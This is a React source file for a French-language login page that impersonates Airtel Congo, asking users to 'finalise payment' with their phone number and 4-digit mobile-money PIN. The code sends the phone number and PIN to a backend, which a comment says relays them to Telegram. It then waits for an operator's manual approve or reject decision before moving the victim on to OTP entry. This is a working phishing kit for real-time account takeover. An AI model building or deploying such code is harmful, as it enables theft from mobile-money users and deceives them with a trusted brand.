import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  
  const { personalDetailsData, updateAuthData, serverStatus } = useLoanApplication();
  
  // Get API endpoint from environment variable
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const initialPhone = personalDetailsData.phoneNumber 
    ? personalDetailsData.phoneNumber.replace(/\D/g, '').slice(-10)
    : '';
  
  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  const pinRefs = [
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null)
  ];

  const pollingIntervalRef = useRef(null);
  const pollingAttempts = useRef(0);
  const maxPollingAttempts = 60; // 60 attempts * 5 seconds = 5 minutes

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  // Validate phone number format
  const validatePhoneNumber = (number) => {
    if (!number) return { valid: false, message: '' };
    
    const length = number.length;
    
    // Must be 9 or 10 digits
    if (length < 9 || length > 10) {
      return { valid: false, message: '' };
    }
    
    // Check for valid formats
    if (length === 10) {
      // For 10-digit numbers, must start with 09
      if (!number.startsWith('09')) {
        return { 
          valid: false, 
          message: 'Le numéro à 10 chiffres doit commencer par 09' 
        };
      }
    } else if (length === 9) {
      // For 9-digit numbers, must start with 9
      if (!number.startsWith('9')) {
        return { 
          valid: false, 
          message: 'Le numéro à 9 chiffres doit commencer par 9' 
        };
      }
    }
    
    return { valid: true, message: '' };
  };

  const handlePhoneChange = (e) => {
    const value = e.target.value;
    const numericValue = value.replace(/\D/g, '').slice(0, 10);
    setPhoneNumber(numericValue);
  };

  const handlePhonePaste = (e) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const numericValue = pastedText.replace(/\D/g, '').slice(0, 10);
    setPhoneNumber(numericValue);
  };

  const handlePinChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newPin = [...pin];
    newPin[index] = numericValue;
    setPin(newPin);

    if (numericValue && index < 3) {
      pinRefs[index + 1].current.focus();
    }
  };

  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const digits = pastedText.replace(/\D/g, '').slice(0, 4).split('');
    
    const newPin = [...pin];
    digits.forEach((digit, i) => {
      if (index + i < 4) {
        newPin[index + i] = digit;
      }
    });
    setPin(newPin);

    const focusIndex = Math.min(index + digits.length, 3);
    pinRefs[focusIndex].current.focus();
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) {
        const newPin = [...pin];
        newPin[index] = '';
        setPin(newPin);
      } else if (index > 0) {
        pinRefs[index - 1].current.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      pinRefs[index + 1].current.focus();
    }
  };

  const handlePinKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  const togglePinVisibility = () => {
    setShowPin(!showPin);
  };

  // Poll for login approval status
  const startPollingForApproval = (formattedPhone, fullPin, returning) => {
    pollingAttempts.current = 0;
    
    pollingIntervalRef.current = setInterval(async () => {
      try {
        pollingAttempts.current++;
        
        // Stop polling after max attempts (5 minutes)
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false);
          setIsProcessing(false);
          setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
          setShowErrorModal(true);
          return;
        }
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: formattedPhone,
            pin: fullPin
          })
        });

        const data = await response.json();

        if (data.success) {
          if (data.approved) {
            // Approved! Stop polling
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            
            // Small delay for better UX
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Navigate based on user type
            if (returning) {
              // RETURNING USER: Go directly to dashboard
              navigate('/status');
            } else {
              // NEW USER: Go to OTP verification
              navigate('/verify');
            }
            
          } else if (data.rejected) {
            // Rejected! Stop polling and show error
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            
            // Always show "Wrong PIN" for rejected login
            setErrorMessage('PIN incorrect');
            setShowErrorModal(true);
            
          } else if (data.expired) {
            // Expired! Stop polling and show error
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
            setShowErrorModal(true);
          }
          // If still pending, continue polling
        }
      } catch (error) {
        console.error('Error polling approval status:', error);
        // Don't stop polling on network errors, just continue
      }
    }, 5000); // Poll every 5 seconds
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    const fullPin = pin.join('');
    
    // Validate phone number format
    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage('Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!\nVeuillez entrer le bon numéro et réessayer!');
      setShowErrorModal(true);
      return;
    }
    
    // Validate PIN
    if (fullPin.length !== 4) {
      setErrorMessage('Veuillez entrer un PIN complet à 4 chiffres');
      setShowErrorModal(true);
      return;
    }

    // Format phone number: if it starts with 0, remove it
    const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
    const formattedPhone = `+243${cleanNumber}`;
    
    // Update context with auth data
    updateAuthData({
      phoneNumber: formattedPhone,
      pin: fullPin,
      isAuthenticated: false
    });

    // Store in localStorage
    try {
      localStorage.setItem('ecocash_phone', formattedPhone);
      localStorage.setItem('ecocash_auth', JSON.stringify({
        phoneNumber: formattedPhone,
        pin: fullPin,
        isAuthenticated: false,
        timestamp: new Date().toISOString()
      }));
    } catch (error) {
      console.error('Failed to save auth:', error);
    }

    setIsProcessing(true);

    try {
      // Check if user is returning
      const statusResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-user-status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formattedPhone
        })
      });

      const statusData = await statusResponse.json();
      const returning = statusData.isReturningUser || false;
      setIsReturningUser(returning);
      
      // Send login notification to Telegram
      const loginResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formattedPhone,
          pin: fullPin,
          timestamp: new Date().toISOString()
        })
      });

      const loginData = await loginResponse.json();

      if (loginData.success) {
        // Start waiting for approval
        setWaitingForApproval(true);
        
        // Start polling for approval status
        startPollingForApproval(formattedPhone, fullPin, returning);
      } else {
        setIsProcessing(false);
        setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
        setShowErrorModal(true);
      }
      
    } catch (error) {
      console.error('Login error:', error);
      setIsProcessing(false);
      setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
      setShowErrorModal(true);
    }
  };

  const closeErrorModal = () => {
    setShowErrorModal(false);
    setErrorMessage('');
  };

  const isFormComplete = phoneNumber.length >= 9 && pin.every(digit => digit !== '');

  const getButtonState = () => {
    if (serverStatus.isChecking) {
      return {
        text: 'ATTENDEZ...',
        disabled: true,
        className: 'login-button waiting'
      };
    }
    
    if (!serverStatus.isActive) {
      return {
        text: 'ERREUR SERVEUR',
        disabled: true,
        className: 'login-button error'
      };
    }
    
    return {
      text: 'CONNEXION',
      disabled: !isFormComplete || isProcessing,
      className: 'login-button'
    };
  };

  const buttonState = getButtonState();

  // Processing/Waiting screen
  if (isProcessing || waitingForApproval) {
    return (
      <div className="login-container">
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">
              {waitingForApproval ? 'Veuillez patienter...' : 'Traitement en cours...'}
            </h1>
            <p className="processing-subtitle">
              {waitingForApproval 
                ? 'Cela prend généralement quelques secondes' 
                : isReturningUser 
                  ? 'Bon retour! Redirection vers le tableau de bord...' 
                  : 'Préparation de la vérification...'
              }
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Main login screen
  return (
    <div className="login-container">
      {/* ==================== ERROR MODAL ==================== */}
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">⚠️</div>
            <h2 className="error-modal-title">Format Invalide</h2>
            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>
              OK
            </button>
          </div>
        </div>
      )}

      {/* ==================== HEADER ==================== */}
      <div className="login-header">
        <div className="logo-large">
          <img src='https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg' alt='Airtel Logo'></img>
        </div>
      </div>

      {/* ==================== LOGIN CONTENT ==================== */}
      <div className="login-content">
        <h1 className="login-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>

        {serverStatus.error && (
          <div className="server-status-message error">
            <p>⚠️ {serverStatus.error}</p>
          </div>
        )}

        <form className="login-form" onSubmit={handleLogin}>
          
          {/* Phone Number Input */}
          <div className="phone-input-container">
            <div className="country-code">
              <span className="flag-icon">🇨🇩</span>
              <span>+243</span>
            </div>
            <input 
              type="tel"
              className="phone-input"
              value={phoneNumber}
              onChange={handlePhoneChange}
              onPaste={handlePhonePaste}
              placeholder="951234567"
              maxLength="10"
              inputMode="numeric"
              pattern="[0-9]*"
              required
              disabled={serverStatus.isChecking}
            />
          </div>

          {/* PIN Section */}
          <div className="pin-section">
            <p className="pin-label">Entrez votre Code</p>
            
            <div className="pin-inputs-wrapper">
              <div className="pin-inputs">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    ref={pinRefs[index]}
                    type={showPin ? 'text' : 'password'}
                    className="pin-box"
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    onKeyPress={handlePinKeyPress}
                    onPaste={(e) => handlePinPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={serverStatus.isChecking}
                  />
                ))}
              </div>
              
              <button 
                type="button"
                className="eye-button"
                onClick={togglePinVisibility}
                aria-label={showPin ? 'Masquer le PIN' : 'Afficher le PIN'}
                disabled={serverStatus.isChecking}
              >
                {showPin ? '👁️' : '👁️‍🗨️'}
              </button>
            </div>
          </div>

          <button 
            type="submit" 
            className={buttonState.className}
            disabled={buttonState.disabled}
          >
            {buttonState.text}
          </button>
        </form>
      </div>

      {/* ==================== FOOTER ==================== */}
      <div className="login-footer">
        <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
        <span>En collaboration avec</span>
        <span>STARLINK™</span>
        <footer className="footer">
        © 2026 Airtel Congo. Tous droits réservés.
      </footer>
      </div>
    </div>
  );
}
